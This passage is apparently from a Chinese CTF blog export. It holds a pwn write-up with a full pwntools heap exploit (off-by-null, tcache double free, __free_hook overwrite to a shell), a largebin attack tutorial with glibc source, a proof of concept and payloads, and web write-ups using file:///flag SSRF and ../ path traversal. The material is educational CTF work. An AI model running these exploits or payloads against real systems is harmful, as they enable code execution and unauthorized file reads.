puts(&quot;NO CHOICE&quot;);      &#125;    &#125;    else    &#123;      if ( v3 != 1 )        goto LABEL_13;      add();    &#125;  &#125;&#125;\n\n菜单题 其他函数没有什么好说的 重点看两个函数 delete和edit\nunsigned __int64 del()&#123;  int v1; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  printf(&quot;Index: &quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 &lt;= 31 )  &#123;    free(Page[v1]);    Page[v1] = 0LL;    Size[v1] = 0;  &#125;  return __readfsqword(0x28u) ^ v2;&#125;\n\n指针置零了  没有办法UAF\nunsigned __int64 edit()&#123;  int v1; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  printf(&quot;Index: &quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 &lt;= 31 &amp;&amp; Page[v1] )  &#123;    printf(&quot;Content: &quot;);    vuln(Page[v1], Size[v1]);  &#125;  return __readfsqword(0x28u) ^ v2;&#125;\n\n具体跟进到vuln函数\nvoid __fastcall vuln(_BYTE *a1, int a2)&#123;  int v2; // [rsp+14h] [rbp-Ch]  if ( a2 &gt; 0 )  &#123;    v2 = 0;    while ( read(0, a1, 1uLL) == 1 )    &#123;      if ( *a1 == &#x27;\\n&#x27; || (++a1, v2 == a2) )      &#123;        *a1 = 0;        return;      &#125;      ++v2;    &#125;  &#125;&#125;\n\n注意这里有一个off by null的漏洞 读入的换行符会被替换成0\n首先要泄露libc基址  这里采用unsortedbin泄露基址的办法\n但是由于远程靶机的版本是ubuntu18.04 新增了tcache\n所以我们要先把tcache填满\n前置代码:\nfrom os import lseekfrom pwn import*#io = process(&quot;./null&quot;)io = remote(&quot;120.79.18.34&quot;,20273)libc = ELF(&quot;./libc-2.27.so&quot;)elf = ELF(&quot;./null&quot;)context.log_level = &quot;debug&quot;def add(index,size):    io.recvuntil(&quot;:&quot;)    io.sendline(b&quot;1&quot;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;Size &quot;)    io.sendline(str(size))    io.recvuntil(&quot;OK&quot;)def free(index):    io.recvuntil(&quot;:&quot;)    io.sendline(b&quot;4&quot;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))def edit(index,content):    io.recvuntil(&quot;:&quot;)    io.sendline(b&quot;2&quot;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;Content: &quot;)    io.sendline(content)def print(index):    io.recvuntil(&quot;:&quot;)    io.sendline(b&quot;3&quot;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))\n\nadd(0,0x18)#0add(1,0x68)#1add(2,0x68)#2for i in range(3,10):    add(i,0xd0)for i in range(3,10):    free(i)edit(0,b&#x27;a&#x27;*0x18+b&#x27;\\xe1&#x27;)\n\n我们先申请三个堆块 chunk1和2用来合并成一个fake chunk\n这里注意一下后续申请的七个chunk大小\n后续gdb动调看一下就很容易明白\n\n这里可以看到 chunk1和chunk2已经合并成了一个0xe1大小的堆块\n我们具体查看一下当前chunk的内容\n\n可以看到是因为刚才的edit改变了chunk1的size大小\n接着我们free一下chunk1 此时由于tcache已经被填满了 所以chunk1就会被释放到unsortedbin\n由于其机制  所以此时fd和bk都会指向main_arena+0x??的地址\n通过再次申请一个chunk 再调用print函数 就可以打印出我们需要的地址 此时再计算偏移 就可以求出基址\nfree(1)add(10,0x68)print(10)\n\n我们逐步拆分一下这一层的操作\n首先是执行完free\n\n成功划入unsortedbin\n再申请一个大小为0x68的chunk(只申请一半  是为了接下来的double free做铺垫)\n\n跟进看一下新申请的chunk的内容\n\n这里你会发现两个的chunk fd和bk差了208\n这正是0xd0的十进制\n但是这并不妨碍我们计算基址\n记录下此时动调的fd值\n在gdb中我们输入vmmap libc查看一下当前程序运行的libc基址\n然后求出偏移 虽然程序每次运行的libc基址和我们泄露出来的main_arena地址都会变化\n但是这个偏移值是固定的\n\nlibc_addr = main_arena_addr - offsetoffset = 0x7fa1d8fa7d70 - 0x7fa1d8bbc000\n\n基址出来以后 one_gadget和free_hook以及system的地址都可以求出来了\n由于程序开启了FULL RELRO保护 我们不能篡改free函数的got表\n但是我们可以修改free_hook函数的got表\n这里可以应用double free的办法来把free_hook的函数地址放到tcache链上\n先把计算基址和一些必要的数据的exp放出来\nprint(10)free_got = elf.got[&#x27;free&#x27;]io.recvuntil(&quot;Content: &quot;)main_arean = u64(io.recvuntil(&quot;\\x7f&quot;).ljust(8,b&quot;\\x00&quot;))libc_addr = main_arean -(0x7f91b42a5d70-0x7f91b3eba000)system_addr  = libc_addr + libc.sym[&#x27;system&#x27;]binsh_addr   = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))onegadget_addr = libc_addr + 0x4f302free_hook = libc.symbols[&#x27;__free_hook&#x27;]+libc_addr \n\n此时我们再次申请一个大小为0x68的chunk 你会发现 这个chunk的指针和我们之前申请的chunk2是共享的\n所以我们可以先free chunk2 再编辑chunk11的内容  此时你会发现我们编辑进chunk11的内容会被串连到bin链上\nadd(11,0x68)free(2)edit(11,p64(free_hook))\n\n\n此时我们再申请一个chunk 就会取出bin中第一个chunk  再取出一个 就会获得指向free_hook的chunk\n此时我们编辑该chunk的内容 就相当于像free_hook中写入任意\n最终exp:\nfrom os import lseekfrom pwn import*io = process(&quot;./null&quot;)libc = ELF(&quot;./libc-2.27.so&quot;)elf = ELF(&quot;./null&quot;)context.log_level = &quot;debug&quot;def add(index,size):    io.recvuntil(&quot;:&quot;)    io.sendline(b&quot;1&quot;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;Size &quot;)    io.sendline(str(size))    io.recvuntil(&quot;OK&quot;)def free(index):    io.recvuntil(&quot;:&quot;)    io.sendline(b&quot;4&quot;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))def edit(index,content):    io.recvuntil(&quot;:&quot;)    io.sendline(b&quot;2&quot;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;Content: &quot;)    io.sendline(content)def print(index):    io.recvuntil(&quot;:&quot;)    io.sendline(b&quot;3&quot;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))add(0,0x18)#0add(1,0x68)#1add(2,0x68)#2for i in range(3,10):    add(i,0xd0)for i in range(3,10):    free(i)edit(0,b&#x27;a&#x27;*0x18+b&#x27;\\xe1&#x27;)free(1)add(10,0x68)print(10)free_got = elf.got[&#x27;free&#x27;]io.recvuntil(&quot;Content: &quot;)main_arean = u64(io.recvuntil(&quot;\\x7f&quot;).ljust(8,b&quot;\\x00&quot;))libc_addr = main_arean -(0x7f91b42a5d70-0x7f91b3eba000)system_addr  = libc_addr + libc.sym[&#x27;system&#x27;]binsh_addr   = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))onegadget_addr = libc_addr + 0x4f302free_hook = libc.symbols[&#x27;__free_hook&#x27;]+libc_addr add(11,0x68)free(2)edit(11,p64(free_hook))add(12,0x68)add(13,0x68)edit(13,p64(onegadget_addr))free(13)io.interactive()\n\n","categories":["wp"]},{"title":"LargebinAttack","url":"/2023/03/04/LargebinAttack/","content":"Largebin介绍Largebin用来收容超过0x400大小以上的chunk(64位) 其是一个双向链表一共可以容纳63个chunk 和fastbin等不同的是 其对于链表对应存储chunk的大小没有明确规定 而是一个范围一共分为6组这里的差值(以字节为单位)是一个什么意思呢  比如在组别1中 现在释放三个chunk到largebin中 chunkA的大小是0x400 chunkB的大小是0x410 chunkC的大小是0x450此时由于chunkC和chunkA的差值大于了64字节 所以chunkA和chunkB是位于同一组中 chunkC是另外一组这在largebin这个双向链表中是一个什么情形呢 我们知道 largebin相对于unsortedbin多出来两个域 一个fd_nextsize 一个bk_nextsize这两个域和fd和bk的域差距在哪里呢?在largebin中 不同组的排列是根据从大到小来的 方便其遍历fd_nextsize指向的是比当前组别小的组中最大的组bk_nextsize指向的是比当前组别大的组中最小的组而fd和bk则是用来指向组内的chunk这么说可能不太好理解 用一张图来演示一下size最大的chunk的bk_nextsize指向最小的chunksize最小的chunk的fd_nextsize指向最大的chunk并且相同大小的chunk只有链表头的fd_nextsize和bk_nextsize才有值 其余为0\nLargebin中chunk的插入取出机制插入源码理解来看看glibc源码是如何逐步使得chunk插入到largebin链表中\n/* place chunk in bin */          if (in_smallbin_range (size))        //如果是smallbin的大小就放到smallbin           &#123;             victim_index = smallbin_index (size);             bck = bin_at (av, victim_index);             fwd = bck-&gt;fd;           &#125;         else                                                    //如果是largebin的大小，那么：           &#123;             victim_index = largebin_index (size);//根据size获取对应的largebin索引             bck = bin_at (av, victim_index);         //获取largebin表头             fwd = bck-&gt;fd;                                             //获取对应索引largebin的第一个chunk（循环链表的head-&gt;next）              /* maintain large bins in sorted order */             if (fwd != bck)                                            //当第一个不等于最后一个（即当前的largebin不空）               &#123;                 /* Or with inuse bit to speed comparisons */                 size |= PREV_INUSE;                 /* if smaller than smallest, bypass loop below */                 assert (chunk_main_arena (bck-&gt;bk));    //是否在main_arena?（主线程）                 if ((unsigned long) (size)             &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))//bck-&gt;bk储存的是当前索引的largebin中大小最小的chunk，如果我们要插入的chunk比这个大小还小，那么就要插入largebin的尾部。                   &#123;                     fwd = bck;                                    //fwd此时为largebin表头                     bck = bck-&gt;bk;                            //bck设置为largebin中最后一个的chunk                      victim-&gt;fd_nextsize = fwd-&gt;fd;//由于我们要插入的在末尾，比他小的就是循环回去的第一个chunk                     victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;//比他大的就是之前的最小的那个                      //原来链表的第一个chunk的bk指向此时新插入的最后一个chunk                     fwd-&gt;fd-&gt;bk_nextsize =                     victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;                   &#125;                  // 如果不是插入尾部，那么我们要找到这个chunk应该插入的位置                 else                   &#123;                     assert (chunk_main_arena (fwd));                     //使用这个while循环尝试从链表头部开始遍历，直到找到一个比victim大或等于的chunk退出while                     while ((unsigned long) size &lt; chunksize_nomask (fwd))                       &#123;                         fwd = fwd-&gt;fd_nextsize;            //取下一个                                                 assert (chunk_main_arena (fwd));//检查分配区                       &#125;                      //如果找到了跟他想等的                     if ((unsigned long) size                                             == (unsigned long) chunksize_nomask (fwd))                       /* Always insert in the second position.  */                       fwd = fwd-&gt;fd;//直接将victim插入他的后面（通过fd），不修改nextsize指针。                      //如果大小不一样(即此时fwd是相邻的大于victim的chunk)                     //需要构造nextsize双向链表，构造新节点,victim作为堆头                     else                       &#123;                         //比victim小的指向fwd                         //比victim大的指向fwd的bk_nextsize（比fwd大的那个）                         //相当于插入了fwd与fwd-&gt;bk_nextsize之间                         victim-&gt;fd_nextsize = fwd;                         victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;                          if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))//检查size链完整性                           malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;);                         //对应的去改fwd的相关指针成链                         fwd-&gt;bk_nextsize = victim;                         victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;                         //插入完成                       &#125;                      bck = fwd-&gt;bk;                     if (bck-&gt;fd != fwd)                       malloc_printerr (&quot;malloc(): largebin double linked list corrupted (bk)&quot;);                   &#125;               &#125;             else               victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;//此时victim为唯一的chunk，也要做循环链表           &#125;                   //放到对应的 bin 中，构成 bk&lt;--&gt;victim&lt;--&gt;fwd。         mark_bin (av, victim_index);    //标识bitmap         victim-&gt;bk = bck;         victim-&gt;fd = fwd;         fwd-&gt;bk = victim;         bck-&gt;fd = victim;\n\n上述的源码注释来源自\n[原创]Largebin attack总结-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com)\n以下是我自己对于这个过程的理解\n1.释放一个chunk后 首先对其大小进行判断 区分到smallbin或者是largebin 这里不讨论smallbin的情况\n2.根据当前chunk的size 来索引对应的index 并且获得两个位于链表中chunk的指针 fwd指向链表头 也就是最大的chunk\nbck指向最小的chunk\n3.对于fwd和bck进行判断 如果二者相等 那么此时链表中就为空 直接将chunk放置为链表头 如果二者不相同 那么链表不为空 分为两种情况 如果chunk的size不是当前链表中最小的 从链表头开始 根据fd_nextsize指针来从大到小依次对比链表中原有的chunk大小和要插入的chunk大小 如果没有找到 那么就在对应合适的位置将当前chunk置为对应的链表头 其fd_nextsize和bk_nextsize各自指向对应的链表 如果找到了 就接入对应链表中 fd_nextsize和bk_nextsize为0 \n4.如果当前chunk的size是当前链表中最小的 那么就直接放置到链表末尾 如果作为链表头 fd_nextsize指向最大的chunk的链表头 构成一个循环 bk_nextsize指向比当前链表更大一点的链表 如果链表尾的大小与要插入的chunk大小一致 那么就接在对应链表中\n调试接下来我们来调试一番                 \n调试环境  \n                                            \nadd(0x410,b&#x27;aaaa&#x27;)#0add(0x10,b&#x27;aaaa&#x27;)#1delete(0)debug()\n\nchunk1用来防止chunk0释放以后和top chunk合并 \n此时chunk0释放以后优先进入unsortedbin\n\n要使得重新分配unsortedbin中的chunk 就需要我们申请一个超过unsortedbin中所有chunk大小的堆块 这样就会把unsortedbin中所有的chunk分配到largebin或者smallbin中\n否则则将大小足够分配申请的chunk的free chunk分配出所需要的大小 其余unsortedbin中的chunk各自检验大小放入到largebin中\nadd(0x450,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)add(0x490,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)add(0x500,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)delete(0)delete(2)delete(4)add(0x460,b&#x27;aaaa&#x27;)debug()\n\n\n接着我们来看看双链表结构大概是一个什么样子\nadd(0x450,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)add(0x490,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)add(0x500,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)delete(0)delete(2)delete(4)add(0x550,b&#x27;aaaa&#x27;)debug()\n\n申请三个大小足够放入到largebin的chunk 并且为了防止物理相邻合并用0x10大小的chunk隔开 最后申请一个大chunk将unsortedbin的chunk分配到largebin中 此时预期这三个chunk应该各自成为链表头\n\n此时我们在原来的基础上再多申请一个0x450大小的chunk 不出意外应该是分配到0x440链表后\n\n\n可以看到只有位于链表头的chunk的fd_nextsize和bk_nextsize才有值\n具体的利用手法等下来讲吧 更进一步的调试可以自己尝试\n取出源码理解/*         If a large request, scan through the chunks of current bin in         sorted order to find smallest that fits.  Use the skip list for this.       */      if (!in_smallbin_range (nb))//如果不在samllbin大小中        &#123;          bin = bin_at (av, idx); //找到申请的size对应的largebin链表           /* skip scan if empty or largest chunk is too small */          if ((victim = first (bin)) != bin &amp;&amp;                    //此时victim为链表的第一个节点              (unsigned long) (victim-&gt;size) &gt;= (unsigned long) (nb)) //第一步，判断链表的第一个结点，即最大的chunk是否大于要申请的size            &#123;                //进入这里时，已经确定链表第一个节点——即最大的chunk大于要申请的size，那么我们就应该从这一条链中取，问题就是取这一条链上的哪一个？              victim = victim-&gt;bk_nextsize; //本来victim是链中最大的那个，现在我们要从小往遍历，那么victim-&gt;bk_nextsize就循环回了链中最小的那个              while (((unsigned long) (size = chunksize (victim)) &lt;                      (unsigned long) (nb))) //第二步，从最小的chunk开始，反向遍历 chunk size链表，直到找到第一个大于等于所需chunk大小的chunk退出循环                victim = victim-&gt;bk_nextsize;//victim取相邻的更大size的chunk               /* Avoid removing the first entry for a size so that the skip                 list does not have to be rerouted.  */              if (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size) //第三步，申请的chunk对应的chunk存在多个结点，则申请相应堆头的下个结点，不申请堆头。                victim = victim-&gt;fd;            //出现相同大小时堆头作为次优先申请               remainder_size = size - nb;              unlink (av, victim, bck, fwd); //第四步，largebin unlink 操作               /* Exhaust */              if (remainder_size &lt; MINSIZE) //第五步，如果剩余的空间小于MINSIZE，则将该空间直接给用户                &#123;                  set_inuse_bit_at_offset (victim, size);                  if (av != &amp;main_arena)                    victim-&gt;size |= NON_MAIN_ARENA;                &#125;              /* Split */              else                &#123;                  remainder = chunk_at_offset (victim, nb); //第六步，如果当前剩余空间还可以构成chunk，则将剩余的空间放入到unsorted bin中（切割后）。                   /* We cannot assume the unsorted list is empty and therefore                     have to perform a complete insert here.  */                  bck = unsorted_chunks (av);//bck是ub头                  fwd = bck-&gt;fd;                         //fwd是ub第一个chunk      if (__glibc_unlikely (fwd-&gt;bk != bck))                    &#123;                      errstr = &quot;malloc(): corrupted unsorted chunks&quot;;                      goto errout;                    &#125;                  remainder-&gt;bk = bck;                  remainder-&gt;fd = fwd;                  bck-&gt;fd = remainder;                  fwd-&gt;bk = remainder;                //以上操作完成后lastremainder被插入ub，成为新的链首元素                //如果不在smallbin范围，那么nextsize指针置空                  if (!in_smallbin_range (remainder_size))                    &#123;                      remainder-&gt;fd_nextsize = NULL;                      remainder-&gt;bk_nextsize = NULL;                    &#125;                   set_head (victim, nb | PREV_INUSE |                            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));                  set_head (remainder, remainder_size | PREV_INUSE);                  set_foot (remainder, remainder_size);                &#125;              check_malloced_chunk (av, victim, nb);              void *p = chunk2mem (victim);              alloc_perturb (p, bytes);              return p;            &#125;        &#125;\n\n可以总结为以下流程:\n1.首先读取largebin中最大chunk的大小 与用户申请的大小对比 如果小于则另寻办法申请chunk 如果大于就进入下一步\n2.根据bk_nextsize来索引最小的chunk 顺着fd_nextsize来寻找与申请大小最为接近的chunk\n3.如果查找到了合适的free chunk 先判断其是否只有单一chunk位于链表头 如果链表中有其他chunk的话 则分配其他chunk 这样是为了节省重新分配fd_nextsize和bk_nextsize的麻烦\n4.判断分配完了的free chunk 如果剩余的大小大于MINSIZE 那么就放入到unsortedbin中 如果剩余大小小于MINSIZE 则一并分配给用户\n调试首先是我自己的第一个疑问 如何申请到单位不是MINSIZE的chunk 先来尝试一下手动修改size值 看看会不会按照预期效果分配chunk\n\n将这一个chunk的size域从0x461修改为0x466 按照源代码的逻辑 此时申请一个0x410大小的chunk 剩下被分配到unsortedbin的chunk大小应该为0x40\n\n失败了 看来是无法单单通过修改size域来实现预期效果 \n到这里转念一想 64位构成一个chunk最起码也要0x20字节 毕竟还需要size域和prev_size域 也就是说如果此时largebin中有一个0x460的free chunk 我们申请一个0x450的chunk 显然会剩下0x10字节 小于MINSIZE 那么按照逻辑 就应该一起给了用户申请的chunk\n\n可以看到确实是这样\n漏洞利用修改bk_nextsize来造成overlap漏洞的原理在于将chunk从largebin中取出的时候 其是从最小的chunk开始索引 以此找到适合的free chunk用来分配\nif ((victim = first (bin)) != bin &amp;&amp;             (unsigned long) (victim-&gt;size) &gt;= (unsigned long) (nb)) //判断链表的第一个结点，即最大的chunk是否大于要申请的size           &#123;             victim = victim-&gt;bk_nextsize;              while (((unsigned long) (size = chunksize (victim)) &lt;                     (unsigned long) (nb)))                victim = victim-&gt;bk_nextsize;  //漏洞点，伪造bk_nextsize             if (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)                victim = victim-&gt;fd;             remainder_size = size - nb;             unlink (av, victim, bck, fwd);       ...      return p;\n\n关键点在于victim &#x3D; victim-&gt;bk_nextsize这一句 如果我们修改了victim的bk_nextsize域 再构造一个fake chunk 就可以申请到fake chunk\n通常这一做法被用来构造overlap chunk 接下来详细分析一下\n环境: libc2.23\n漏洞目的:实现overlap chunk\n漏洞需求:拥有向largebin中释放堆块的能力 能够泄露出堆地址 拥有堆溢出\n演示二进制程序:由笔者自己编写 基本所有漏洞都有\n首先我们需要先泄露libc基址 在没有UAF的前提下 我们可以通过申请两个chunk 将其释放到fastbin中 此时后释放的chunk位于链表头 其fd指向先释放的chunk 由于malloc函数在申请chunk的后并不会对chunk的内容进行清空 所以我们可以再次申请同样大小的chunk 将链表头的chunk申请出来 随后打印出chunk的内容 也就是泄露基址\nadd(0x10,b&#x27;aaaa&#x27;)#0add(0x10,b&#x27;aaaa&#x27;)#1delete(1)delete(0)add(0x10,b&#x27;1&#x27;)#2show(2)io.recv()heap_addr = u64(io.recv(4).ljust(8,b&#x27;\\x00&#x27;))-0x31success(hex(heap_addr))add(0x10,b&#x27;aaaa&#x27;)#3    把还在fastbin中的chunk1申请回来 理论上应该不影响 但是在之前chunk extend的时候有影响 所以还是申请出来为妙\n\n我们一共需要两个chunk 下面我们分别称这些chunk为chunkA B\nchunkA是要放入到largebin中的 并且其要为largebin中最大的chunk 这样修改chunkA的bk_nextsize域才能索引到fake chunk\nchunkB则是用来构造fake chunk的\n在学习unlink的时候 当时的unlink可以做到任意地址申请 因为最后chunk的ptr和fd、bk域有关\nlargebin的unlink则是用来申请一个正在使用的chunk 从而导致overlap 为此我们只需要绕过一个判断即可\nif (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))  malloc_printerr (&quot;corrupted double-linked list&quot;);\n\n我们需要使得 fake chunk的fd域或者是bk域指向的地址 以此地址为chunk首地址 其bk域和fd域相应的存放fake chunk的首地址\n\n此时的chunkB的内部构造应该是这个样子 这里之所以在fake_nextsize域后还要再加上fakechunk的首地址 就是为了绕过unlink检查\n这里的fakechunk首地址放到哪里都行 只需要修改fd或者bk域  就比如图中的情况来说 我们需要保证这个值+0x20以后的地址存放着fakechunk的首地址 也就是我们需要填入chunkB+0x28 由于unlink的判断只需要满足一个就行 所以图中的构造其实是多余的\n还需要注意的是nextsize域需要设置为0 因为如果nextsize域有值 plmalloc就会去申请下一个堆块 而非链表头的堆\nbss_addr = 0x602200add(0x10,b&#x27;aaaa&#x27;)#0add(0x10,b&#x27;aaaa&#x27;)#1delete(1)delete(0)add(0x10,b&#x27;1&#x27;)#2show(2)io.recv()heap_addr = u64(io.recv(4).ljust(8,b&#x27;\\x00&#x27;))-0x31success(hex(heap_addr))add(0x10,b&#x27;aaaa&#x27;)#3add(0x470,b&#x27;aaaa&#x27;)#4add(0x20,b&#x27;aaaa&#x27;)#5delete(4)add(0x480,b&#x27;aaaa&#x27;)#6chunkB_addr = heap_addr +0x4f0success(&quot;chunkB_addr :&quot;+hex(chunkB_addr))payload = cyclic(0x18)+p64(0x481)+p64(0)*3+p64(chunkB_addr+0x10)edit(3,len(payload),payload)payload = cyclic(0x28)+p64(0x491)payload1 = p64(0)+p64(0x481)+p64(chunkB_addr+0x40-0x18)+p64(chunkB_addr+0x40-0x10)+p64(0)*2+p64(chunkB_addr+0x10)*2payload1 = payload1.ljust(0x480,b&#x27;\\x00&#x27;)payload = payload+payload1edit(5,len(payload),payload)# payload = p64(chunkB_addr+0x10)*2# bss_write(bss_addr,payload)add(0x470,b&#x27;aaaa&#x27;)#8debug()\n\n代码中注释的部分是bss段上构造双向链表 不过感觉正常的题不会给这个机会 也就我自己编写的题会给一个bss_write函数了\n修改bk域和bk_nextsize域实现任意地址写堆地址这种利用手法的意义在于 fastbin对于申请出来的chunk的大小和对应链表有检测 如果利用这个的话 就可以绕过这个检测\n利用的关键在于源码中的这两处地方\n victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;  #1victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;  fwd-&gt;bk = victim;  #2\n\n第一句 此时的victim指向的是要放入largebin的chunk 其bk_nextsize域的值由fwd的bk_nextsize域决定 \n而victim的bk_nextsize指向的地址的fd_nextsize域会存入victim的地址 所以如果我们修改fwd的bk_nextsize域 就可以做到堆地址写\n第二句  fwd的bk域指向的地址会存入victim的地址 这里同样可以利用\n所以我们只需要修改已经位于largebin中的一个chunk的bk域和bk_nextsize域 同时释放一个size大于其的chunk进入largebin 就可以利用漏洞\nbss_addr = 0x602200add(0x400,b&#x27;aaaa&#x27;)#0add(0x10,b&#x27;aaaa&#x27;)#1delete(0)add(0x410,b&#x27;aaaa&#x27;)#2add(0x410,b&#x27;aaaa&#x27;)#3payload = p64(0)+p64(bss_addr)+p64(0)+p64(bss_addr)edit(0,len(payload),payload)delete(2)add(0x430,b&#x27;aaaa&#x27;)#4debug()\n\n之所以chunk3的大小要同为可以被释放进largebin 是因为防止过小从chunk0中分配 导致chunk0被放入到unsortedbin 调大chunk0的值同样可行\nchunk4的目的在于将chunk2放入到largebin\n\n此时的bss_addr内容如图所示 以0x602200为首地址 两字长后为bk域 是fwd-&gt;bk &#x3D; victim的效果 也就是如果我们修改fwd的bk域 那么任意写的地址在于ptr_addr + 0x10\nbk_nextsize的值则是victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim的效果 也就是我们修改fwd的bk_nextsize域 任意写的地址在于ptr_addr + 0x20\nlargebin的利用在高版本中还是比较常见的 许多house of系列就是基于largebin的 需要好好掌握\n2.31以上漏洞利用2.31对于largebin的检查做了一些增强 虽然还是能够largebinattack 往任意地址写堆地址 但是攻击效果没有那么强大了\n新版本针对largebin 新增了两个检查 导致我们原本的方法行不通了\nif (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd)) malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;);if (bck-&gt;fd != fwd) malloc_printerr (&quot;malloc(): largebin double linked list corrupted (bk)&quot;);\n但是还是有办法 原本我们利用的是比largebin中大的chunk放入largebin 引起的那些操作与之相对的 还有小chunk放入largebin中的操作 不过只能往一个地址写入堆地址 相比之攻击效果不够强大 所以一开始没有使用\nif ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;    fwd = bck;    bck = bck-&gt;bk;    victim-&gt;fd_nextsize = fwd-&gt;fd;    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;&#125;\n\n上面就是我们要利用的代码 直接跟着我来源码调试吧  这样就清楚了\n我写的POC：\n#include&lt;stdio.h&gt;#include&lt;malloc.h&gt;int main()&#123;  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 2, 0);  puts(&quot;make by chen&quot;);  char test_array[0x20];  size_t *p1 = malloc(0x460); //largebin  malloc(0x10); //to separate  size_t *p2 = malloc(0x450); //unsortedbin  malloc(0x450); //to separate  free(p1);  malloc(0x470); //Release p1 into largebin  free(p2);  //Release p2 into unsortedbin  *(p1+3) = test_array-0x20;  malloc(0x470); //Release p2 into largebin&#125;\n\n\n申请四个chunk chunk1和4用来防止合并 接着释放chunk0 随后申请一个大chunk 把chunk0放入到largebin中 并且把chunk2也放入到unsortedbin中\n\n接着我们需要伪造chunk0的bk_nextsize 将其修改为ptr_addr-0x20 然后把chunk2释放到largebin中 \ns进入malloc函数 接着n到int_malloc函数 再次s进入\n\n断点打在这三行源代码所在的行数 我所用的源码是3846 然后c到这里即可\n\n此时的victim-&gt;fd_nextsize即chunk2的fd_nextsize域  fwd-&gt;fd指向chunk0\n执行完这步后 chunk2的fd_nextsize域写入chunk0的地址\n\n下一句相当于 chunk2的bk_nextsize域写入chunk0的bk_nextsize域内容\n接下来一句就是我们任意写的关键了\n往chunk0的bk_nextsize域 以及chunk2的bk_nextsize的fd_nextsize域写入chunk2地址 但是前一句 已经修改了chunk2的bk_nextsize域为chunk0的bk_nextsize域 所以此时是往我们修改的Ptr_addr+0x20写入chunk2地址\n总结一下 就是修改largebinchunk的bk_nextsize为ptr_addr-0x20 就可以往ptr_addr写入unsortedchunk的地址\n","categories":["堆"]},{"title":"NISACTF 2022","url":"/2022/11/17/NISACTF-2022/","content":"easyssrf题目提示说是ssrf\nhttps://xz.aliyun.com/t/2115\n这里猜测是利用file协议来打开相应的文件\npayload = file:///flag\n\n返回:都说了这里看不了flag。。但是可以看看提示文件：&#x2F;fl4g\npayload = file:///fl4g\n\n返回: file:&#x2F;&#x2F;&#x2F;fl4g 的快照如下：你应该看看除了index.php，是不是还有个ha1x1ux1u.php\n跟进一下 发现了源代码\n &lt;?phphighlight_file(__FILE__);error_reporting(0);$file = $_GET[&quot;file&quot;];if (stristr($file, &quot;file&quot;))&#123;  die(&quot;你败了.&quot;);&#125;//flag in /flagecho file_get_contents($file); \n\nstristr屏蔽了file协议 那试一下目录穿越\npayload = ?file=../../../../../../flag\n\n成功获得flag\ncheckin &lt;?phperror_reporting(0);include &quot;flag.php&quot;;// ‮⁦NISACTF⁩⁦Welcome toif (&quot;jitanglailo&quot; == $_GET[ahahahaha] &amp;‮⁦+!!⁩⁦&amp; &quot;‮⁦ Flag!⁩⁦N1SACTF&quot; == $_GET[‮⁦Ugeiwo⁩⁦cuishiyuan]) &#123; //tnnd! weishenme b    echo $FLAG;&#125;show_source(__FILE__);?&gt; \n\n一开始看到以为是最简单的get传参 但是试了一下发现不行 网上查询wp后发现\n猫腻在于php的高亮显示规定 这段源码有不可见字符在作祟 我们选中NISA会发现Welcome也被选中了\n\n我们将源码复制进文本文件 然后用010打开 这样可以显示不可见字符的16进制\nps:这里我遇到了一个问题 用火狐浏览器复制源码最后和用edge浏览器复制的源码不一样 火狐的源码是错误的 暂时不知道解决原因\n\n可以看出第一个参数ahahahaha并没有被动手脚  后方的参数有问题\n选中-&gt;编辑-&gt;复制为-&gt;16进制文本\nE2 80 AE E2 81 A6 55 67 65 69 77 6F E2 81 A9 E2 81 A6 63 75 69 73 68 69 79 75 61 6E //参数名\n\n%E2%80%AE%E2%81%A6%55%67%65%69%77%6F%E2%81%A9%E2%81%A6%63%75%69%73%68%69%79%75%61%6E //将空格转成%\n\nE2 80 AE E2 81 A6 